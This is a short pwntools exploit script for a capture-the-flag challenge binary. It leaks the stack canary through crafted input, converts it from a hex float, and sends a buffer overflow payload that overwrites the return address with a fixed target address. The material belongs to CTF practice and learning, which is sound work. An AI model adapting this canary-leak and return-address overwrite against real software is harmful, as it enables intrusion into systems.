from pwn import *
BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 9999
LOCAL = True
if LOCAL:
    p = gdb.debug(BINARY, '''
    b *main+196
    b *main+201
    ''')
else:
    p = remote(IP, PORT)
if not LOCAL:
    print(p.recv())  # Weird behaviour from the server
p.sendline(b'8')
for i in range(8):
    p.sendline(b'-')
    print('sent -')
print(p.recv(), end="")
hexed_canary_line = p.recvline().decode()
print(hexed_canary_line, end="")
hexed_canary = hexed_canary_line.split(' ')[-1]
print(f"This is the hexed_canary: {hexed_canary}")
bytes_canary = struct.pack('<d', float.fromhex(hexed_canary))
print(f'Converted canary: {bytes_canary}')
print(p.recv())
payload = b'A' * 10 + bytes_canary + b'A' * 8 + p64(0x0000000000400736)
print("target address:", p64(0x0000000000400736))
p.sendline(payload)
print(f'Sent: {payload}')
print(p.recv())
print(p.recv())
p.close()
